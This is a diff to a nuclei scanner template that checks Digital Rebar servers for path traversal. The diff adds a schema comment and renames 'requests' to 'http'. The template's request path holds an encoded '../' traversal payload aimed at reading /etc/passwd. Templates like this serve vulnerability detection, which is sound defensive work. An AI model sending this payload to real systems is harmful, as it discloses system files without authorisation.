@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: digitalrebar-traversal
 
 info:
@@ -10,7 +11,7 @@ info:
     - https://docs.rackn.io/en/latest/doc/release.html
   tags: lfi,rackn,digitalrebar
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
